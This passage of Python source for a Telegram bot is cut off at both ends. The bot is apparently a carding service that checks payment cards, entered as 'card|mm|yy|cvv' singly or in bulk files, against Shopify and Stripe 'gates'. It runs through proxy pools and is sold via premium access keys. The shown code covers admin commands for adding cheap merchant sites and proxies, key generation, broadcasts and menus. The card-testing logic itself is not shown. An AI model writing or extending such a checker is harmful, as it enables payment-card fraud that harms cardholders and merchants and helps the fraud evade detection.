        f"✅ <b>Site Added</b>\n<b>{SEP}</b>\n<code>{url}</code>\n"
        f"💵 Price: ${price:.2f}\n"
        f"📋 Total: {len(curr)+1} sites"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsite\s*$'))
async def addsite_bulk_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    if not event.reply_to_msg_id:
        await event.reply(pe(
            f"<b>🌐 Add Sites (Bulk)</b>\n<b>{SEP}</b>\n"
            f"Reply to a <code>.txt</code> with URLs (one per line)\n"
            f"<b>{SEP}</b>\n"
            f"✅ Checks via API · 60s per site\n"
            f"⚠️ Unknown-price & above-limit sites are SKIPPED\n"
            f"📁 Sends clean.txt + skipped.txt at end"), parse_mode='html'); return
    reply = await event.get_reply_message()
    if not reply.file or not (reply.file.name or '').endswith('.txt'):
        await event.reply(pe(f"❌ Reply to a <code>.txt</code> file"), parse_mode='html'); return
    if not _load_proxies_file():
        await event.reply(pe(f"❌ <b>No proxies.</b> Add via <code>/addproxy</code> first."),
                          parse_mode='html'); return
    fp = await reply.download_media()
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
    try: os.remove(fp)
    except: pass
    lines = [l.strip() for l in content.splitlines() if l.strip() and l.strip().startswith('http')]
    if not lines:
        await event.reply(pe(f"❌ No URLs found"), parse_mode='html'); return
    curr = load_sites()
    to_test = [u for u in lines if u not in curr]
    if not to_test:
        await event.reply(pe(f"⚠️ All sites already exist"), parse_mode='html'); return

    max_p = get_max_site_price()
    msg = await event.reply(pe(
        f"🔍 <b>Checking {len(to_test)} sites via API</b>\n<b>{SEP}</b>\n"
        f"<i>Sequential · 60s per site · Max ${max_p:.2f}</i>\n"
        f"<code>{make_progress_bar(0, len(to_test))}</code>"), parse_mode='html')

    clean, upper, failed, unknown = [], [], [], []

    for i, site in enumerate(to_test, 1):
        try:
            alive, price, reason = await test_site_with_price(site)
        except Exception as e:
            alive, price, reason = False, None, f'{type(e).__name__}'

        if not alive:
            failed.append((site, reason)); status_icon = "❌"
            await _report_site_error(site, reason)
        elif price is None:
            unknown.append((site, 'unknown price')); status_icon = "⚠️ price unknown"
        elif price <= max_p:
            clean.append((site, price)); status_icon = f"✅ ${price:.2f}"
        else:
            upper.append((site, price)); status_icon = f"💵 ${price:.2f}"

        price_display = f"${price:.2f}" if price else "—"
        try:
            await msg.edit(pe(
                f"🔍 <b>Site {i}/{len(to_test)}</b>\n<b>{SEP}</b>\n"
                f"📡 <code>{site[:55]}</code>\n"
                f"💵 Price: <b>{price_display}</b>  »  {status_icon}\n"
                f"<b>{SEP}</b>\n"
                f"✅ Clean: {len(clean)}\n"
                f"💵 Over limit: {len(upper)}\n"
                f"⚠️ Unknown: {len(unknown)}\n"
                f"❌ Failed: {len(failed)}\n"
                f"<code>{make_progress_bar(i, len(to_test))}</code>"),
                parse_mode='html')
        except: pass

    if clean:
        async with aiofiles.open(SITES_FILE, 'a') as f:
            for site, _ in clean: await f.write(f"{site}\n")

    D = "─" * 44
    if clean:
        lines_out = [f"{D}\n  ✅ CLEAN SITES ({len(clean)})\n  ≤ ${max_p:.2f} — added to bot\n{D}\n\n"]
        for site, price in clean:
            lines_out.append(f"{site}\n  Price: ${price:.2f}\n{D}\n")
        async with aiofiles.open("clean_sites.txt", 'w') as f:
            await f.write("".join(lines_out))
        await bot.send_file(event.sender_id, "clean_sites.txt",
            caption=pe(f"✅ <b>Clean Sites » {len(clean)}</b>\n<b>{SEP}</b>\n"
                      f"≤ ${max_p:.2f} · added to bot pool\n{DEV_LINE}"),
            parse_mode='html')
        try: os.remove("clean_sites.txt")
        except: pass

    if upper or failed or unknown:
        lines_out = [f"{D}\n  💵 SKIPPED / FAILED\n{D}\n\n"]
        if upper:
            lines_out.append(f"  ── 💵 OVER LIMIT  ({len(upper)}) ────────────────\n\n")
            for site, price in upper:
                lines_out.append(f"{site}\n  Price: ${price:.2f}\n{D}\n")
        if unknown:
            lines_out.append(f"\n  ── ⚠️ UNKNOWN PRICE  ({len(unknown)}) ─────────\n\n")
            for site, reason in unknown:
                lines_out.append(f"{site}\n  Reason: {reason}\n{D}\n")
        if failed:
            lines_out.append(f"\n  ── ❌ FAILED  ({len(failed)}) ────────────────\n\n")
            for site, reason in failed:
                lines_out.append(f"{site}\n  Reason: {reason}\n{D}\n")
        async with aiofiles.open("upper_sites.txt", 'w') as f:
            await f.write("".join(lines_out))
        await bot.send_file(event.sender_id, "upper_sites.txt",
            caption=pe(f"💵 <b>Skipped / Failed » {len(upper) + len(failed) + len(unknown)}</b>\n<b>{SEP}</b>\n"
                      f"💵 Over limit: {len(upper)}\n"
                      f"⚠️ Unknown: {len(unknown)}\n"
                      f"❌ Failed: {len(failed)}\n{DEV_LINE}"),
            parse_mode='html')
        try: os.remove("upper_sites.txt")
        except: pass

    await msg.edit(pe(
        f"✅ <b>Site Check Complete</b>\n<b>{SEP}</b>\n"
        f"📋 Total: {len(to_test)}\n"
        f"✅ Clean: {len(clean)}\n"
        f"💵 Over limit: {len(upper)}\n"
        f"⚠️ Unknown: {len(unknown)}\n"
        f"❌ Failed: {len(failed)}\n"
        f"<b>{SEP}</b>\n"
        f"Clean sites added · files sent above\n"
        f"{DEV_LINE}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/(rm|rmsite)(\s+[\s\S]*)?$'))
async def rmsite_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    body = event.message.text.split(None, 1)
    urls = []
    if len(body) > 1 and body[1].strip():
        urls.extend(l.strip() for l in body[1].splitlines() if l.strip())
    if not urls and event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if reply and reply.text:
            urls.extend(l.strip() for l in reply.text.splitlines() if l.strip())
        elif reply and reply.file and (reply.file.name or '').endswith('.txt'):
            fp = await reply.download_media()
            if fp:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                try: os.remove(fp)
                except: pass
                urls.extend(l.strip() for l in content.splitlines() if l.strip())
    if not urls:
        await event.reply(pe(
            f"<b>🗑️ Remove Sites</b>\n<b>{SEP}</b>\n"
            f"<b>Single:</b>\n"
            f"<code>/rmsite https://example.com</code>\n"
            f"<b>Multiple (one per line):</b>\n"
            f"<code>/rmsite\nhttps://a.com\nhttps://b.com\nhttps://c.com</code>\n"
            f"<b>Or reply to a .txt file:</b>\n"
            f"<code>/rmsite</code>\n"
            f"<b>{SEP}</b>\n"
            f"⚠️ URLs must match exactly as stored."
        ), parse_mode='html'); return

    curr = load_sites()
    kept    = list(curr)
    removed = []
    for u in urls:
        if u in kept:
            kept.remove(u)
            removed.append(u)

    if not removed:
        await event.reply(pe(
            f"❌ <b>None Found</b>\n<b>{SEP}</b>\n"
            f"None of the {len(urls)} URL(s) exist in the site list."),
            parse_mode='html'); return

    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in kept: await f.write(f"{s}\n")

    sample = "\n".join(f"  • <code>{u[:55]}</code>" for u in removed[:10])
    extra  = f"\n  <i>+{len(removed)-10} more...</i>" if len(removed) > 10 else ""
    await event.reply(pe(
        f"✅ <b>Sites Removed</b>\n<b>{SEP}</b>\n"
        f"🗑️ <b>Removed:</b> {len(removed)}\n"
        f"📋 <b>Remaining:</b> {len(kept)}\n"
        f"<b>{SEP}</b>\n{sample}{extra}"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def addproxy_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    content = event.message.text[len('/addproxy'):].strip()
    if not content and event.reply_to_msg_id:
        reply = await event.get_reply_message()
        if not reply.file or not (reply.file.name or '').endswith('.txt'):
            await event.reply(pe(f"❌ Reply to a <code>.txt</code> file"), parse_mode='html'); return
        fp = await reply.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
        try: os.remove(fp)
        except: pass
    elif not content:
        await event.reply(pe(
            f"📡 <b>Add Proxies (Legacy)</b>\n<b>{SEP}</b>\n"
            f"⚠️ Users must set own proxies via <code>/setproxy</code>.\n"
            f"Pool is only for site-checking helper.\n"
            f"<b>{SEP}</b>\n"
            f"<code>/addproxy ip:port</code>\n"
            f"Bulk: reply <code>.txt</code> with <code>/addproxy</code>"), parse_mode='html'); return

    lines = [l.strip() for l in content.splitlines() if l.strip()]
    if not lines:
        await event.reply(pe(f"❌ No proxies found"), parse_mode='html'); return
    curr = load_proxies()
    candidates = []
    for l in lines:
        p = normalize_proxy(l)
        if p and p not in curr and p not in candidates:
            candidates.append(p)
    if not candidates:
        await event.reply(pe(f"⚠️ <b>All proxies already in pool.</b>"), parse_mode='html'); return

    msg = await event.reply(pe(f"⏳ <b>Testing {len(candidates)} proxies...</b>"), parse_mode='html')
    sem = asyncio.Semaphore(30)
    alive, dead = [], 0
    async def check_one(p):
        async with sem:
            r = await test_proxy(p)
            return p, r.get('status') == 'alive'
    for i in range(0, len(candidates), 60):
        batch = candidates[i:i+60]
        results = await asyncio.gather(*[check_one(p) for p in batch])
        for p, ok in results:
            if ok: alive.append(p)
            else: dead += 1
        try:
            await msg.edit(pe(
                f"⏳ <b>Testing...</b>\n<b>{SEP}</b>\n"
                f"✅ Alive: {len(alive)}\n❌ Dead: {dead}\n"
                f"📊 {min(i+60, len(candidates))}/{len(candidates)}"), parse_mode='html')
        except: pass

    if not alive:
        await msg.edit(pe(
            f"❌ <b>No Live Proxies</b>\n<b>{SEP}</b>\n"
            f"All {len(candidates)} proxies failed. Nothing saved."), parse_mode='html'); return
    async with aiofiles.open(PROXY_FILE, 'a') as f:
        for p in alive: await f.write(f"{p}\n")
    await msg.edit(pe(
        f"✅ <b>Proxies Added</b>\n<b>{SEP}</b>\n"
        f"✅ Alive: {len(alive)}\n❌ Dead (skipped): {dead}\n"
        f"📋 Total pool: {len(curr)+len(alive)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clearproxy_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    curr = load_proxies()
    if not curr:
        await event.reply(pe(f"⚠️ <b>Proxy pool is already empty.</b>"), parse_mode='html'); return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    bk = f"proxy_backup_{event.sender_id}_{ts}.txt"
    async with aiofiles.open(bk, 'w') as f:
        for p in curr: await f.write(f"{p}\n")
    await event.reply(pe(f"📋 <b>Backup  ({len(curr)} proxies)</b>"), file=bk, parse_mode='html')
    try: os.remove(bk)
    except: pass
    async with aiofiles.open(PROXY_FILE, 'w') as f: await f.write("")
    await event.reply(pe(f"✅ <b>Proxy Pool Cleared</b>\n🗑️ Removed {len(curr)} proxies."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
async def broadcast_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    txt = event.message.text.split(' ', 1)[1].strip()
    targets = set()
    for u in load_premium_users():
        try: targets.add(int(u))
        except: pass
    for u in ADMIN_IDS: targets.add(u)
    if not targets:
        await event.reply(pe(f"⚠️ <b>No users to broadcast to.</b>"), parse_mode='html'); return
    status = await event.reply(pe(f"📡 <b>Broadcasting... ({len(targets)} targets)</b>"), parse_mode='html')
    sent = failed = 0
    for t in targets:
        try:
            await bot.send_message(t, pe(
                f"📢 <b>Announcement  —  {BOT_BRAND}</b>\n<b>{SEP}</b>\n{txt}\n"
                f"<b>{SEP}</b>\n{DEV_LINE}"), parse_mode='html')
            sent += 1
            await asyncio.sleep(0.1)
        except: failed += 1
    await status.edit(pe(
        f"📡 <b>Broadcast Complete</b>\n✅ Delivered: {sent}\n❌ Failed: {failed}"),
        parse_mode='html')

# ══════════════════════════════════════════════════════════
# Keys
# ══════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/genkey(\s+\d+)?(\s+\d+)?$'))
async def genkey_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.strip().split()
    count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
    days  = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 30
    count = max(1, min(count, 50))
    keys = [generate_key(days) for _ in range(count)]
    listed = "\n".join(f"  <code>{k}</code>" for k in keys)
    expiry_note = f"{days} days" if days > 0 else "never expires"
    await event.reply(pe(
        f"✅ <b>{count} Key(s) Generated</b>\n<b>{SEP}</b>\n"
        f"⏰ Expiry: <b>{expiry_note}</b>\n<b>{SEP}</b>\n{listed}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/listkeys$'))
async def listkeys_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    keys = list_keys(limit=100)
    if not keys:
        await event.reply(pe(f"📋 <b>No keys generated yet.</b>"), parse_mode='html'); return
    lines = []
    for k, v in keys:
        st = "❌ used" if v.get('used') else "✅ unused"
        lines.append(f"  <code>{k}</code>  {st}  ·  {key_expiry_text(v)}")
    await event.reply(pe(f"📋 <b>Keys ({len(keys)})</b>\n<b>{SEP}</b>\n" + "\n".join(lines)),
                      parse_mode='html')

# ══════════════════════════════════════════════════════════
# GC + channels
# ══════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/setprivategc(\s+\S+)?$'))
async def set_privategc(event):    await _set_gc_slot(event, 'private_gc', 'Private GC')
@bot.on(events.NewMessage(pattern=r'^/setpublicgc(\s+\S+)?$'))
async def set_publicgc(event):     await _set_gc_slot(event, 'public_gc', 'Public GC')
@bot.on(events.NewMessage(pattern=r'^/setloggc(\s+\S+)?$'))
async def set_loggc(event):        await _set_gc_slot(event, 'log_gc', 'Log GC')
@bot.on(events.NewMessage(pattern=r'^/setpublicchannel(\s+\S+)?$'))
async def set_publicchannel(event):await _set_gc_slot(event, 'public_channel', 'Public Channel')

@bot.on(events.NewMessage(pattern=r'^/addreqchannel\s+'))
async def addreqchannel(event):
    if event.sender_id != OWNER_ID:
        await event.reply(pe(f"❌ <b>Owner only.</b>"), parse_mode='html'); return
    raw = event.message.text.split(' ', 1)[1].strip()
    if raw.startswith('https://t.me/'):
        raw = '@' + raw.replace('https://t.me/', '').split('?')[0].split('/')[0]
    if raw.startswith('@') or raw.lstrip('-').isdigit():
        info = await asyncio.to_thread(_get_chat_info, raw)
        if not info:
            await event.reply(pe(
                f"❌ <b>Cannot resolve</b> <code>{raw}</code>\n"
                f"<b>{SEP}</b>\nMake bot <b>admin</b> in that channel first."),
                parse_mode='html'); return
        canonical = f"@{info['username']}" if info.get('username') else str(info['id'])
    else:
        await event.reply(pe(
            f"❌ <b>Invalid format</b>\n<b>{SEP}</b>\n"
            f"Use <code>@username</code> or <code>-100...</code>"),
            parse_mode='html'); return
    cfg = load_gc_config()
    if canonical in cfg['required_channels']:
        await event.reply(pe(f"⚠️ <b>Already added.</b>\n🆔 <code>{canonical}</code>"), parse_mode='html'); return
    cfg['required_channels'].append(canonical); save_gc_config(cfg)
    await event.reply(pe(
        f"✅ <b>Required Channel Added</b>\n<b>{SEP}</b>\n"
        f"🆔 <code>{canonical}</code>\n🔗 Total: {len(cfg['required_channels'])} channels"),
        parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmreqchannel\s+'))
async def rmreqchannel(event):
    if event.sender_id != OWNER_ID:
        await event.reply(pe(f"❌ <b>Owner only.</b>"), parse_mode='html'); return
    ref = event.message.text.split(' ', 1)[1].strip()
    if ref.startswith('https://t.me/'):
        ref = '@' + ref.replace('https://t.me/', '').split('?')[0].split('/')[0]
    if ref.lstrip('-').isdigit():
        info = await asyncio.to_thread(_get_chat_info, ref)
        if info and info.get('username'): ref = f"@{info['username']}"
        else: ref = str(info['id']) if info else ref
    cfg = load_gc_config()
    if ref not in cfg['required_channels']:
        await event.reply(pe(f"❌ <b>Not found</b>\n🆔 <code>{ref}</code>"), parse_mode='html'); return
    cfg['required_channels'] = [c for c in cfg['required_channels'] if c != ref]
    save_gc_config(cfg)
    await event.reply(pe(
        f"✅ <b>Removed</b>\n🆔 <code>{ref}</code>\n"
        f"🔗 Remaining: {len(cfg['required_channels'])}"),
        parse_mode='html')

# ══════════════════════════════════════════════════════════
# API endpoint commands
# ══════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/addapi\s+'))
async def addapi_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    parts = event.message.text.split()
    if len(parts) < 2:
        await event.reply(pe(f"❌ Usage: <code>/addapi URL [KEY]</code>"), parse_mode='html'); return
    url = parts[1].strip().rstrip('/')
    key = None
    if len(parts) >= 3:
        key_raw = parts[2].strip()
        if key_raw.lower().startswith('key='):
            key = key_raw[4:]
        else:
            key = key_raw
    ok, msg = add_api_endpoint(url, key)
    if not ok:
        await event.reply(pe(f"⚠️ <b>{msg}</b>"), parse_mode='html'); return
    d = load_api_endpoints()
    active_url = d['endpoints'][d['active_idx']]['url']
    active_short = active_url.replace('http://','').replace('https://','')
    await event.reply(pe(
        f"✅ <b>Endpoint Added</b>\n<b>{SEP}</b>\n"
        f"🔗 <code>{url}</code>\n"
        f"🔑 Key: <code>{key or 'none'}</code>\n"
        f"📊 Total: <b>{len(d['endpoints'])}</b>\n"
        f"🟢 Active: <code>{active_short}</code>"
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmapi\s+.*$'))
async def rmapi_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(pe(f"❌ <b>Admin only.</b>"), parse_mode='html'); return
    arg = event.message.text.split(' ', 1)[1].strip()
    if arg.isdigit():
        idx = int(arg) - 1
        ok, msg = remove_api_endpoint_by_index(idx)
    else:
        ok, msg = remove_api_endpoint_by_url(arg)
    if not ok:
        await event.reply(pe(f"❌ <b>{msg}</b>"), parse_mode='html'); return
    d = load_api_endpoints()
    active_url = d['endpoints'][d['active_idx']]['url']
    active_short = active_url.replace('http://','').replace('https://','')
    await event.reply(pe(
        f"✅ <b>Endpoint Removed</b>\n<b>{SEP}</b>\n"
        f"📊 Remaining: <b>{len(d['endpoints'])}</b>\n"
        f"🟢 Active: <code>{active_short}</code>"
    ), parse_mode='html')

# ══════════════════════════════════════════════════════════
# Callbacks — gates, proxy, admin, api, owner
# ══════════════════════════════════════════════════════════
@bot.on(events.CallbackQuery(pattern=b"gates"))
async def cb_gates(event):
    if not is_premium(event.sender_id):
        await event.answer("❌ Access required!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>💳 Gates  —  {BOT_BRAND}</b>\n<b>{SEP}</b>\n<blockquote>"
        f"💳 <b>Shopify</b>       »  /sh · /msh\n"
        f"🔥 <b>Stripe 1$</b>     »  /st1 · /mst1\n"
        f"💎 <b>Stripe 5$</b>     »  /st5 · /mst5\n"
        f"✅ <b>Stripe Auth2</b>  »  /auth · /mauth\n"
        f"⚡ <b>Auth2 v2</b>      »  /auth1 · /mauth1"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"), rows_gates())

@bot.on(events.CallbackQuery(pattern=b"gate_shopify"))
async def cb_gate_sh(event):
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>💳 Shopify Checker</b>\n<b>{SEP}</b>\n"
        f"⚡ <b>Single:</b> <code>/sh card|mm|yy|cvv</code>\n"
        f"🔥 <b>Mass:</b> send <code>.txt</code> file\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"),
        [[{"text": "↪️ Back", "callback_data": "gates"}]])

@bot.on(events.CallbackQuery(pattern=b"gate_st1"))
async def cb_gate_st1(event):
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>🔥 Stripe 1$</b>\n<b>{SEP}</b>\n"
        f"⚡ <code>/st1 card|mm|yy|cvv</code>\n"
        f"🔥 <code>/mst1</code> (reply .txt or one-per-line)\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"),
        [[{"text": "↪️ Back", "callback_data": "gates"}]])

@bot.on(events.CallbackQuery(pattern=b"gate_st5"))
async def cb_gate_st5(event):
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>💎 Stripe 5$</b>\n<b>{SEP}</b>\n"
        f"⚡ <code>/st5 card|mm|yy|cvv</code>\n"
        f"🔥 <code>/mst5</code> (reply .txt or one-per-line)\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"),
        [[{"text": "↪️ Back", "callback_data": "gates"}]])

@bot.on(events.CallbackQuery(pattern=b"gate_auth"))
async def cb_gate_auth(event):
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>✅ Stripe Auth2 $0</b>\n<b>{SEP}</b>\n"
        f"⚡ <code>/auth card|mm|yy|cvv</code>\n"
        f"🔥 <code>/mauth</code> (reply .txt or one-per-line)\n"
        f"<b>{SEP}</b>\n{DEV_LINE}"),
        [[{"text": "↪️ Back", "callback_data": "gates"}]])

@bot.on(events.CallbackQuery(pattern=b"gate_auth1"))
async def cb_gate_auth1(event):
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>⚡ Stripe Auth2 $0 v2</b>\n<b>{SEP}</b>\n"
        f"⚡ <code>/auth1 card|mm|yy|cvv</code>\n"
        f"🔥 <code>/mauth1</code> (reply .txt or one-per-line)\n"
        f"<b>{SEP}</b>\n<i>Uses expanded 380+ site list</i>"),
        [[{"text": "↪️ Back", "callback_data": "gates"}]])

@bot.on(events.CallbackQuery(pattern=b"redeem_info"))
async def cb_redeem(event):
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"🔑 <b>Redeem Key</b>\n<b>{SEP}</b>\nUsage: <code>/redeem OGGY-PROO-XXXX</code>"),
        [[{"text": "↪️ Back", "callback_data": "back_start"}]])

@bot.on(events.CallbackQuery(pattern=b"check_join"))
async def cb_check_join(event):
    missing = await _check_force_join(event.sender_id)
    if missing:
        await event.answer("❌ Still not joined all channels.", alert=True); return
    await event.answer("✅ Verified!", alert=False)
    try: await event.delete()
    except: pass

@bot.on(events.CallbackQuery(pattern=b"manage_proxy"))
async def cb_manage_proxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True); return
    ul = get_user_proxy_list(uid)
    ps = f"✅ {len(ul)} proxy(ies) active" if ul else "❌ No Proxies Set"
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>🔌 Proxy Manager</b>\n<b>{SEP}</b>\n"
        f"👤 <b>Your Proxies</b>  »  {ps}\n"
        f"<b>{SEP}</b>\n"
        f"⚠️ You must add your own proxies before checking.\n"
        f"<b>{SEP}</b>\n"
        f"<code>/setproxy ip:port</code>\n"
        f"<code>/setproxy ip:port:user:pass</code>\n"
        f"Clear: <code>/clearuserproxy</code>"), rows_proxy(uid))

@bot.on(events.CallbackQuery(pattern=b"back_start"))
async def cb_back(event):
    uid = event.sender_id
    try:
        s = await bot.get_entity(uid)
        un = f"@{s.username}" if s.username else f"ID:{uid}"
        fn = s.first_name or "User"
    except:
        un, fn = f"ID:{uid}", "User"
    lim = get_user_limit(uid)
    if is_admin(uid): icon, sl = "👑", "Admin"
    elif is_premium(uid): icon, sl = "✅", "Premium"
    else: icon, sl = "🚫", "No Access"
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"<b>⚡ Welcome, {fn}!</b>\n<b>{SEP}</b>\n<blockquote>"
        f"👤 <b>User</b>     »  {un}\n🆔 <b>ID</b>       »  <code>{uid}</code>\n"
        f"{icon} <b>Status</b>  »  {sl}\n"
        f"📋 <b>Limit</b>   »  {lim if lim else '—'} cards/file</blockquote>\n"
        f"<b>{SEP}</b>\nSelect an option below to get started.\n<b>{SEP}</b>\n{DEV_LINE}"),
        rows_main())

@bot.on(events.CallbackQuery(pattern=b"close"))
async def cb_close(event):
    await event.answer()
    try: await bot.delete_messages(event.chat_id, event.message_id)
    except: pass

@bot.on(events.CallbackQuery(pattern=b"stop_mass"))
async def cb_stop(event):
    uid = event.sender_id; killed = 0
    for k in list(active_sessions.keys()):
        if k.startswith(f"{uid}_"):
            active_sessions.pop(k, None); killed += 1
    if killed:
        await event.answer("⛔ Stopped!", alert=True)
        try:
            await raw_edit(event.chat_id, event.message_id,
                           pe(f"⛔ <b>Mass Check Stopped</b>"), [])
        except: pass
    else:
        await event.answer("No active session.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"toggle_pool"))
async def cb_toggle(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True); return
    cur = user_pool_enabled.get(uid, True)
    user_pool_enabled[uid] = not cur; save_user_pool()
    await event.answer(f"Proxy Pool → {'ON ✅' if not cur else 'OFF ⚡'}", alert=False)
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>🔌 Proxy Manager</b>"), rows_proxy(uid))

@bot.on(events.CallbackQuery(pattern=b"test_proxy_btn"))
async def cb_test_proxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True); return
    ul = get_user_proxy_list(uid)
    if not ul:
        await event.answer("❌ No proxy set.", alert=True); return
    await event.answer("⏳ Testing...", alert=False)
    r = await test_proxy(ul[0])
    if r.get('status') == 'alive':
        ip = await get_proxy_ip(ul[0])
        await event.answer(f"✅ Alive — {ip or 'N/A'}", alert=True)
    else:
        await event.answer("❌ Proxy Dead", alert=True)

@bot.on(events.CallbackQuery(pattern=b"remove_proxy_btn"))
async def cb_rm_proxy(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.answer("❌ Access required!", alert=True); return
    remove_user_proxy(uid)
    await event.answer("✅ Proxy removed!", alert=True)
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>🔌 Proxy Manager</b>"), rows_proxy(uid))

# ── Admin panel ─────────────────────────────────────────
@bot.on(events.CallbackQuery(pattern=b"admin_panel"))
async def cb_admin_panel(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, _admin_panel_text(), rows_admin(event.sender_id))

@bot.on(events.CallbackQuery(pattern=b"admin_users"))
async def cb_admin_users(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>👤 User Management</b>\n<b>{SEP}</b>\n"
                      f"✅ Access List: {len(load_premium_users())} users"), rows_admin_users())

@bot.on(events.CallbackQuery(pattern=b"admin_sites"))
async def cb_admin_sites(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>🌐 Site Management</b>\n<b>{SEP}</b>\n"
                      f"🌐 Active Sites: {len(load_sites())}\n"
                      f"💰 Max Price: ${get_max_site_price():.2f}\n<b>{SEP}</b>\n"
                      f"<code>/addsite URL</code>  or reply to .txt\n"
                      f"<code>/rmsite URL</code>  or multiple per line"),
                   rows_admin_sites())

@bot.on(events.CallbackQuery(pattern=b"admin_proxy_pool"))
async def cb_admin_pp(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>📡 Proxy Pool (Legacy)</b>\n<b>{SEP}</b>\n"
                      f"📡 Pool Size: {len(load_proxies())} proxies\n"
                      f"⚠️ Pool is not used for checks anymore.\n"
                      f"Users must set own proxies via <code>/setproxy</code>.\n"
                      f"<b>{SEP}</b>\n"
                      f"<code>/addproxy ip:port</code>  or reply .txt with /addproxy"),
                   rows_admin_proxy_pool())

@bot.on(events.CallbackQuery(pattern=b"admin_broadcast_info"))
async def cb_admin_bc(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id,
                   pe(f"<b>📢 Broadcast</b>\n<b>{SEP}</b>\nUsage: <code>/broadcast Message</code>"),
                   [[{"text": "↪️ Back", "callback_data": "admin_panel"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_backup"))
async def cb_admin_backup(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer("📦 Generating...", alert=False)
    try:
        await _send_backup_to(event.sender_id)
    except Exception as e:
        await bot.send_message(event.sender_id,
                               pe(f"❌ Backup failed: <code>{str(e)[:100]}</code>"),
                               parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"admin_restore_info"))
async def cb_admin_restore(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"♻️ <b>Restore</b>\n<b>{SEP}</b>\n"
        f"Reply to a <code>.zip</code> with <code>/restore</code>"),
        [[{"text": "↪️ Back", "callback_data": "admin_panel"}]])

@bot.on(events.CallbackQuery(pattern=b"admin_max_price"))
async def cb_admin_max_price(event):
    if not is_admin(event.sender_id):
        await event.answer("❌ Admin only!", alert=True); return
    current = get_max_site_price()
    await event.answer()
    await nav_edit(event.chat_id, event.message_id, pe(
        f"💰 <b>Max Site Price</b>\n<b>{SEP}</b>\n"
        f"💵 Current: <b>${current:.2f}</b>\n"
        f"<b>{SEP}</b>\n"
        f"Set new value:\n<code>/setsiteprice 5.00</code>\n"
